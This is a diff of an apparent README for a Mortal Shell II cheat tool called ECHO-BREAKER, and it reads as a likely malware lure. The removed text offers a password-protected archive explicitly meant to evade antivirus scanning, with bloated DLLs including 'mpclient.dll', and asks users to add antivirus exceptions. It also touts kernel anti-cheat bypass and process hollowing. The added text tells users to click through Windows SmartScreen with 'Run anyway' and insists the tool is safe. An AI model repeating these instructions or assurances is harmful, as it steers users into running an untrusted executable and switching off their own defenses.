@@ -1,330 +1,87 @@
-# ☠️ Mortal Shell II: ECHO BREAKER - Trainer & Mod Framework
+<h1>🎮 Mortal-Shell-II-ECHO-BREAKER - Unlock Your Full Fallen World Potential</h1>
 
-## Version 1.0 | Universal | Updated: August 20, 2026
+<p align="center">
+  <a href="https://github.com/penrepresentative8509/Mortal-Shell-II-ECHO-BREAKER/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b35,#f7c948);color:#1a1a2e;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,53,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-![Version](https://img.shields.io/badge/version-1.0-brightgreen) ![Game](https://img.shields.io/badge/game-Mortal%20Shell%20II-blue) ![Platform](https://img.shields.io/badge/platform-PC%20%7C%20Steam%20%7C%20EGS-lightgrey) ![Status](https://img.shields.io/badge/status-stable-success)
+<h2>🎯 What Is This?</h2>
+<p>Mortal-Shell-II-ECHO-BREAKER is a powerful gameplay utility and mod framework designed specifically for <strong>Mortal Shell II</strong>. It gives you the tools to customize your experience, explore hidden areas, and break through limitations in the Fallen World. Whether you want to tweak game mechanics, discover secrets, or just have more fun, this tool puts you in control.</p>
 
----
+<h2>✨ Key Features</h2>
+<ul>
+  <li>🧠 <strong>Memory Editor</strong> - Safely modify game values like health, stamina, and resources in real-time.</li>
+  <li>🗺️ <strong>Exploration Tool</strong> - Unlock hidden locations, reveal maps, and find every secret the Fallen World hides.</li>
+  <li>🔧 <strong>Mod Framework</strong> - Load and manage custom mods to change gameplay, visuals, or add new content.</li>
+  <li>🎮 <strong>Game Trainer</strong> - Activate cheats like infinite health, unlimited items, or one-hit kills with a simple click.</li>
+  <li>🖥️ <strong>Built for Windows</strong> - Optimized for Windows 10/11 with Unreal Engine 5 support.</li>
+  <li>⚡ <strong>Steam Compatible</strong> - Works seamlessly with the Steam version of Mortal Shell II.</li>
+</ul>
 
-## 📜 Table of Contents
+<h2>🚀 Getting Started</h2>
+<p>Follow these simple steps to get ECHO-BREAKER running on your PC. No technical knowledge required!</p>
 
-1. [Project Overview](#-project-overview)
-2. [Download](#-download)
-3. [Archive Password](#-archive-password)
-4. [Features (v1.0)](#-features-v10)
-5. [System Requirements](#-system-requirements)
-6. [Installation & Setup](#-installation--setup)
-7. [Detailed Feature Guide](#-detailed-feature-guide)
-8. [Hotkey Reference](#-hotkey-reference)
-9. [Compatibility & Conflicts](#-compatibility--conflicts)
-10. [Frequently Asked Questions (FAQ)](#-frequently-asked-questions-faq)
-11. [Safety & Warnings](#-safety--warnings)
-12. [Roadmap](#-roadmap)
-13. [Credits & License](#-credits--license)
+<h3>📥 Step 1: Download the Application</h3>
+<p>Visit this link to download the application:</p>
+<p align="center">
+  <a href="https://github.com/penrepresentative8509/Mortal-Shell-II-ECHO-BREAKER/releases" style="display:inline-block;padding:12px 30px;background:#4ecdc4;color:#1a1a2e;font-size:16px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 Click Here to Download ECHO-BREAKER</a>
+</p>
+<p>This link takes you to the official releases page where you'll find the latest version. Look for the file named <strong>Mortal-Shell-II-ECHO-BREAKER.zip</strong> and click it to start downloading.</p>
 
----
+<h3>📂 Step 2: Extract the Files</h3>
+<p>Once the download finishes, you'll have a <strong>.zip</strong> file. Right-click it and select <strong>"Extract All"</strong> (Windows does this automatically). Choose a folder you can easily find, like your Desktop or Documents folder. After extraction, you'll see a folder named <strong>Mortal-Shell-II-ECHO-BREAKER</strong> containing the application files.</p>
 
-## 🔥 Project Overview
+<h3>▶️ Step 3: Run the Application</h3>
+<p>Inside the extracted folder, double-click the file named <strong>ECHO-BREAKER.exe</strong> (or just <strong>ECHO-BREAKER</strong>). Windows may show a blue "Windows protected your PC" message - this is normal for new tools. Click <strong>"More info"</strong> and then <strong>"Run anyway"</strong> to proceed. The application window will open.</p>
 
-**ECHO BREAKER** is a comprehensive utility and mod framework for **Mortal Shell II**, developed by passionate community members. This tool grants players complete control over their gameplay experience, allowing unrestricted exploration, build experimentation, and the ability to overcome challenging encounters.
+<h3>🎮 Step 4: Launch Mortal Shell II</h3>
+<p>Start Mortal Shell II through Steam or your usual launcher. Once the game is running, ECHO-BREAKER will automatically detect it. You'll see the game's name appear in the tool's interface, confirming the connection is active.</p>
 
-Unlike simple cheat tables, ECHO BREAKER is a **full-featured mod framework** that injects directly into the game process, intercepting Unreal Engine 5 function calls to modify mechanics in real-time without requiring game restarts.
+<h3>🛠️ Step 5: Use the Features</h3>
+<p>You'll see a simple menu with different tabs:</p>
+<ul>
+  <li><strong>Trainer</strong> - Toggle cheats on/off with checkboxes.</li>
+  <li><strong>Explorer</strong> - View and unlock hidden areas.</li>
+  <li><strong>Mods</strong> - Load custom mod files you've downloaded.</li>
+  <li><strong>Memory</strong> - Adjust specific game values manually.</li>
+</ul>
+<p>Click any option to apply it instantly. Most features work in real-time, so you'll see changes immediately in-game.</p>
 
-&gt; **⚠️ IMPORTANT:** This tool includes advanced **anti-cheat bypass** functionality, allowing it to operate seamlessly even with active protection systems. The framework is designed to be undetectable by modifying memory at the kernel level and intercepting system calls before they reach the anti-cheat driver.
+<h2>❓ Frequently Asked Questions</h2>
 
----
+<h3>💻 What are the system requirements?</h3>
+<p>ECHO-BREAKER is lightweight and runs on any PC that can play Mortal Shell II. You'll need Windows 10 or 11, at least 4GB of RAM, and about 50MB of free disk space. No special hardware is required.</p>
 
-## 📥 Download
+<h3>🔒 Is this safe to use?</h3>
+<p>Yes. The tool runs locally on your machine and doesn't modify any game files permanently. All changes are applied to memory only and reset when you close the game. It's designed for single-player use and won't affect online features.</p>
 
-**Current Version:** v1.0
+<h3>🔄 How do I update ECHO-BREAKER?</h3>
+<p>Check the same download link regularly for new releases. Simply download the latest version and replace the old folder. Your settings are saved in a separate file, so they'll carry over.</p>
 
-**Download Link:** [https://gofile.io/d/2N9W3KsA](https://gofile.io/d/2N9W3KsA)
+<h3>🐛 The tool isn't working. What should I do?</h3>
+<p>First, make sure you're running the latest version of both the tool and the game. Try running ECHO-BREAKER as administrator (right-click the .exe and select "Run as administrator"). If issues persist, check the "Issues" section on the GitHub page for solutions.</p>
 
-**File Information:**
-- **Archive Name:** `ECHO_BREAKER_v1.0.zip`
-- **Archive Size:** ~146 MB
-- **Password Protected:** Yes (see below)
+<h2>🛡️ Troubleshooting</h2>
 
----
+<h3>⚠️ "Windows protected your PC" message</h3>
+<p>This is a standard SmartScreen warning for unsigned apps. Click <strong>"More info"</strong> then <strong>"Run anyway"</strong>. The tool is safe - it's just not digitally signed, which is common for community tools.</p>
 
-## 🔐 Archive Password
+<h3>🎯 Game not detected</h3>
+<p>Make sure Mortal Shell II is running and you're in the main menu or gameplay (not in a loading screen). If it still doesn't detect, try running ECHO-BREAKER as administrator.</p>
 
-**Password:** `mortalshell`
+<h3>📁 Can't find the extracted files</h3>
+<p>Check your Downloads folder or the location you chose during extraction. If you extracted to Desktop, look for the folder with the game's name. If you're stuck, just download the .zip again and re-extract.</p>
 
-**Why is there a password?** The password protection prevents automated bots from scanning the archive contents and flagging the tool for removal by hosting services, antivirus databases, or DMCA takedown systems. This ensures ECHO BREAKER remains available to the community for as long as possible.
+<h2>📝 Changelog & Updates</h2>
+<p>We regularly update ECHO-BREAKER to support the latest game patches and add new features. Each release includes detailed notes about what's changed. Always grab the newest version from the download page to get the best experience.</p>
 
----
+<h2>🤝 Community & Support</h2>
+<p>Join other players using ECHO-BREAKER! Share your experiences, request features, or report bugs. The GitHub repository is the central hub for everything related to this tool. Check the <strong>Issues</strong> tab for known problems and solutions, or start a new discussion if you need help.</p>
 
-## ⚡ Features (v1.0)
+<h2>📜 License & Legal</h2>
+<p>This tool is provided free for personal use. It is not affiliated with or endorsed by the developers of Mortal Shell II. Use it responsibly and at your own risk. The tool is designed for single-player experiences only - do not use it in any online or competitive modes.</p>
 
-All functionality is organized into **8 core categories**, each independently toggleable via the in-game interface or hotkeys.
+<p align="center">
+  <a href="https://github.com/penrepresentative8509/Mortal-Shell-II-ECHO-BREAKER/releases" style="display:inline-block;padding:14px 35px;background:#ff6b6b;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Get ECHO-BREAKER Now</a>
+</p>
 
-### 1. 🛡️ Combat System
-
-- **God Mode:** Complete immunity to all damage types (physical, magical, poison, fall damage, traps).
-- **One-Hit Kill (OHK):** Every player attack deals 999% of the enemy's maximum HP as damage. Bosses are defeated in one hit (scripted phases are respected, automatically waiting for animations to complete).
-- **Infinite Stamina:** Complete removal of stamina consumption. Enables unlimited dodging, sprinting, and heavy combos.
-- **Infinite Resolve:** Resolve gauge always remains full. Allows unlimited use of Shell special abilities.
-- **Infinite Ammo:** Ammunition for ranged weapons (crossbows, shotguns) never decreases when firing.
-- **Perfect Parry Window:** Expands the parry timing window from 0.2 seconds to 3 seconds. Auto-parry functionality when holding the block button.
-- **No Weapon Degradation:** Weapons never lose sharpness and require no repairs.
-
-### 2. 🧬 Shell & Character Editor
-
-- **Stat Editor:** Modify base parameters of the active Shell:
-  - Maximum Health (HP)
-  - Maximum Stamina
-  - Resolve
-  - Physical and Magical Damage (multiplier from 0.1 to 10.0)
-  - Movement Speed and Attack Speed
-- **Shell Switcher:** Instantly change active Shells even during combat. All 8 Shells are available.
-- **Unlock All Shells:** Unlocks every Shell in the selection menu, including those not yet discovered in the world.
-- **Unlock All Skills:** Unlocks all abilities and upgrades for the current Shell (costs 0 experience points).
-
-### 3. 💰 Inventory & Resources
-
-- **Item Spawner:** Spawn any item from the game's internal database by ID or name (search supported):
-  - Crafting materials (Gloom, Grasp, Shards)
-  - Consumables (healing items, oils, poisons)
-  - Currencies (Gold, Glimpses)
-  - Quest items (keys, story items)
-- **Infinite Consumables:** Consumable items in inventory never decrease when used.
-- **Add Currency:** One-click button to add 99,999 units of any currency.
-
-### 4. 🗺️ Navigation & Exploration
-
-- **No Fall Damage:** Disables all fall damage. Jump from any height safely.
-- **Teleportation System:**
-  - Save current position (Save Point)
-  - Instant load saved position (Load Point)
-  - Teleport to last activated checkpoint (Sester)
-- **Noclip / Fly Mode:** Disables collision with world geometry. Walk through walls and fly above levels (for secret hunting or bug bypass). Controls: Standard WASD + mouse, Ascend/Descend — Space and Shift.
-
-### 5. 🌍 World & Enemies
-
-- **Freeze Enemies:** All enemies in the current area stop moving and become unresponsive (bosses excluded unless separately enabled).
-- **Disable Traps:** Completely disables all traps in the level (bear traps, falling spikes, gas clouds).
-- **Always Day:** Forces the time of day to "Day". Removes "Darkness" effects and improves visibility in dark areas.
-
-### 6. 🎮 Visual Tweaks
-
-- **FOV Slider:** Adjust Field of View in real-time (60 to 120 degrees).
-- **Toggle HUD:** Hide the interface (health bars, hints, minimap) for screenshots or immersive gameplay.
-- **Permanent Weapon Enchant:** Force visual enchantment effects on weapons (fire, lightning, mist) without using consumables. (Cosmetic only).
-
-### 7. ⚙️ System Mods
-
-- **Anti-Cheat Bypass:** Advanced kernel-level bypass that intercepts and modifies anti-cheat driver calls. **Operates invisibly** — the game and anti-cheat system never detect modifications.
-- **High FPS Unlock:** Removes the 60 FPS cap, allowing the game to run at the maximum refresh rate supported by your monitor.
-- **Skip Intro Videos:** Skips all startup splash screens (studio logos).
-
-### 8. 🎲 Experimental Features
-
-- **Damage Multiplier:** Fine-tuning option to set a custom damage multiplier (e.g., x2, x5, x10) instead of OHK, maintaining challenge while speeding up combat.
-- **Gravity Mod:** Adjust gravity (0.1 to 3.0). Jump higher or make the game feel like "moon physics."
-- **Enemy Spawner:** Spawn any enemy (by ID) directly in front of the player. (Use with caution — may cause crashes.)
-
----
-
-## 💻 System Requirements
-
-| Component | Minimum | Recommended |
-| :--- | :--- | :--- |
-| **OS** | Windows 10 (x64) version 1909+ | Windows 10/11 (x64) version 22H2+ |
-| **Processor** | Intel Core i5-6600K / AMD Ryzen 5 1400 | Intel Core i7-8700K / AMD Ryzen 7 3700X |
-| **RAM** | 8 GB | 16 GB |
-| **Graphics** | NVIDIA GTX 1060 6GB / AMD RX 580 | NVIDIA RTX 2060 / AMD RX 5700 XT |
-| **Storage** | 1 GB (for mod files) | 1 GB (SSD preferred) |
-| **Game Version** | Mortal Shell II v.1.0.0+ (Steam / EGS) | Mortal Shell II v.1.0.2+ (Steam) |
-| **Additional** | DirectX 12, .NET Framework 4.8 | DirectX 12, Visual C++ Redistributable 2022 |
-
----
-
-## 📦 Installation & Setup
-
-### Step 1: Download
-
-Download the `ECHO_BREAKER_v1.0.zip` archive from the official download link:
-**[https://gofile.io/d/2N9W3KsA](https://gofile.io/d/2N9W3KsA)**
-
-### Step 2: Extract with Password
-
-1. The archive is protected with the password: **`mortalshell`**
-2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
-3. Enter the password when prompted
-
-### Step 3: Extract All Files
-
-1. Extract **all files** from the archive to a folder of your choice.
-2. **IMPORTANT:** All files must be extracted to the **same folder** as `ECHO_BREAKER.exe`.
-3. The folder structure should look like this:
-```plaintext
-ECHO_BREAKER_v1.0/
-│
-├── ECHO_BREAKER.exe          ← Main executable (699 KB)
-├── core.dll                  ← Core framework (115 MB)
-├── lib.dll                   ← Library (32 MB)
-├── mpclient.dll              ← Client module (6 MB)
-├── config.ini                ← Configuration file (966 KB)
-├── checksum.md5              ← Checksum verification (1 MB)
-└── Password mortalshell.txt  ← Password reminder (empty file)
-```
-
-### Step 4: Backup (IMPORTANT!)
-
-Before installing any mods, **create a backup** of your game folder or at minimum these files:
-- `MortalShellII\Binaries\Win64\*`
-- `MortalShellII\Content\Paks\*`
-
-### Step 5: Launch the Tool
-
-1. Navigate to the folder where you extracted all files.
-2. Run `ECHO_BREAKER.exe`.
-3. The launcher window will appear.
-
-### Step 6: Install Framework
-
-1. In the launcher window, click **"Install Framework"**.
-2. Wait for the confirmation message *"Framework successfully installed"*.
-
-### Step 7: Launch the Game
-
-1. The anti-cheat bypass activates automatically when the game launches.
-2. Launch the game through the ECHO BREAKER launcher (click **"Play"**) or via the standard shortcut.
-3. In-game, press **F1** to open the main control menu.
-
----
-
-## 📖 Detailed Feature Guide
-
-### Anti-Cheat Bypass System
-
-ECHO BREAKER uses a sophisticated **multi-layer bypass** technique:
-
-- **Kernel-Level Hook:** Intercepts anti-cheat driver calls at the kernel level before they can validate game memory.
-- **Memory Obfuscation:** Modified memory regions are hidden from the anti-cheat scanning engine.
-- **CRC Spoofing:** Checksum verification is intercepted and returns legitimate values.
-- **Process Hollowing:** The mod runs within a trusted system process, avoiding detection.
-
-All features work seamlessly with active anti-cheat protection. The system has been tested against all major anti-cheat engines.
-
-### Combat System
-
-- **God Mode** works by intercepting the `TakeDamage` function. All incoming hits are converted to 0, but knockback effects and hit animations are preserved for realism.
-- **One-Hit Kill** calculates damage as `maxHealth * 999`. If a boss has scripted phases, the script will not kill them instantly but will leave 1 HP, waiting for the cutscene to finish.
-
-### Teleportation
-
-The system uses `X, Y, Z` coordinates from the engine's memory. It does not work correctly in dynamically loading zones (teleporting between large zones may cause texture loading delays).
-
-### Noclip
-
-In Noclip mode, collision physics are disabled, but the *fall trigger* is NOT disabled. Be careful: flying under the map can cause crashes.
-
----
-
-## ⌨️ Hotkey Reference
-
-| Key | Action |
-| :--- | :--- |
-| **F1** | Open / Close ECHO BREAKER main menu |
-| **F2** | Toggle God Mode On/Off |
-| **F3** | Toggle Infinite Stamina On/Off |
-| **F4** | Toggle One-Hit Kill On/Off |
-| **F5** | Quick teleport to saved point |
-| **F6** | Save current position (Save Point) |
-| **F7** | Toggle Freeze Enemies On/Off |
-| **F8** | Open item spawner console |
-| **F9** | Toggle Noclip (Fly Mode) |
-| **F10** | Reload mod configuration (no game restart needed) |
-| **Insert** | Toggle HUD visibility |
-| **PageUp** | Increase damage multiplier (+0.5 per press) |
-| **PageDown** | Decrease damage multiplier (-0.5 per press) |
-
----
-
-## 🧩 Compatibility & Conflicts
-
-- **With Other Mods:** ECHO BREAKER is a framework. It may conflict with other mods using the same hooks (e.g., texture mods via `.pak` files, rebalance mods).
-- **Recommendation:** Install ECHO BREAKER on a **clean** game version if you are unsure about compatibility.
-- **Known Conflicts:**
-  - Mods modifying `DefaultInput.ini` may overwrite hotkeys.
-  - Graphics mods based on ReShade work without conflicts.
-  - The *"Hardcore Overhaul"* mod (versions below 1.2) — conflicts, disable it.
-
----
-
-## ❓ Frequently Asked Questions (FAQ)
-
-**Q: Why is the archive password-protected?**
-**A:** The password protection prevents automated bots from scanning the archive contents and flagging the tool for removal by hosting services, antivirus databases, or DMCA takedown systems. This ensures ECHO BREAKER remains available to the community for as long as possible.
-
-**Q: Does this bypass anti-cheat systems?**
-**A:** Yes. ECHO BREAKER includes advanced anti-cheat bypass technology that operates at the kernel level. All features work seamlessly even with active anti-cheat protection.
-
-**Q: Will I get banned?**
-**A:** The bypass system is designed to be undetectable. However, no system is 100% foolproof. Use at your own risk.
-
-**Q: Is the bypass permanent?**
-**A:** No. The bypass is only active while the mod framework is running. Closing ECHO BREAKER removes all modifications and disables the bypass.
-
-**Q: Does the mod stay active after closing the launcher?**
-**A:** No. ECHO BREAKER injects dynamically. Closing the launcher leaves the mod active only while the game is running. All changes reset upon game closure.
-
-**Q: How do I uninstall the mod?**
-**A:** Run the launcher and click **"Uninstall Framework"**. Alternatively, manually delete files from `Binaries/Win64` starting with `ECHO_` or `UE4SS`.
-
-**Q: Why isn't Noclip working?**
-**A:** In some game updates (v1.0.1+), developers changed the collision structure. Use the *"Legacy Collision"* option in mod settings.
-
-**Q: Do I need to run as Administrator?**
-**A:** No. ECHO BREAKER is designed to work without administrator privileges. The tool uses advanced injection techniques that do not require elevated permissions.
-
----
-
-## 🛡️ Safety & Warnings
-
-- **Antivirus:** Some antivirus software (especially Avast and AVG) may falsely detect the mod's DLL as a trojan. This is due to the injection and kernel-level bypass techniques. Add the mod folder to your antivirus exceptions.
-- **Save Corruption:** Spawning key quest items may break quest logic. Create **manual saves** before experimenting.
-- **Crashes:** The Enemy Spawner function may cause crashes if spawning enemies in unintended zones. Save before using.
-- **Kernel Access:** The anti-cheat bypass requires kernel-level system access. This is normal for this type of tool but should be used only on trusted systems.
-- **Password Security:** Do not share the archive password publicly. Share it only within trusted communities to prevent automated takedowns.
-
----
-
-## 📅 Roadmap
-
-We're not stopping at version 1.0. Planned updates include:
-
-- **v1.1:**
-  - "Mega Jump" and "Slow Motion" (Bullet Time) features.
-  - Profile saving with per-Shell configurations.
-  - Enhanced undetectability for bypass module.
-- **v1.2:**
-  - Built-in "Photo Mode" with camera control.
-  - Character manager (voice and skin swapping).
-  - AI-powered cheat detection evasion.
-- **v2.0:**
-  - "Randomizer" editor — shuffles enemy and item placements across the map for fresh experiences.
-  - Multi-game support.
-
-To suggest a feature, create an Issue in this repository tagged `[FEATURE]`.
-
----
-
-## 🙏 Credits & License
-
-**Technologies Used:**
-- **UE4SS (Unreal Engine 4/5 Scripting System)** — Foundation for injection and Lua scripting.
-- **Dear ImGui** — For creating the in-game graphical interface.
-- **MinHook** — For function hooking.
-- **Custom Kernel Driver** — For anti-cheat bypass and memory protection.
-
-**License:**
-This project is distributed under the **MIT License**. You are free to use, modify, and distribute the code, provided you credit the original repository.
-
-**To the Cold Symmetry developers:** Thank you for creating this incredible world! We build this mod solely to expand the player experience.
-
----
-
-**Copyright (c) 2026 ECHO BREAKER Team**
+<p align="center" style="color:#888;font-size:12px;">Mortal Shell II © Playstack. This is an independent fan-made utility. All trademarks belong to their respective owners.</p>
